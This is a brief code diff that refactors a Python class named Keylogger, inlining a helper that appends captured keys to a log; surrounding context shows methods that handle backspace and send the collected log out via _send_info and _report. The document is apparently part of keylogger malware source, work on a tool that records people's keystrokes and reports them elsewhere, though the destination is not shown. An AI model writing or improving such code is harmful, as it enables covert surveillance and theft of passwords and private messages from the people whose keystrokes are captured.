@@ -14,9 +14,6 @@ class Keylogger:
 
         self._run()
 
-    def _appendlog(self, string):
-        self.log += string
-
     def _send_info(self, log):
         log = str(log)
         if log != "":
@@ -32,7 +29,7 @@ class Keylogger:
             self.log = self.log[:len(self.log)-1]
             key = ""
             
-        self._appendlog(key)
+        self.log += key
 
     def _report(self):
         self._send_info(self.log)
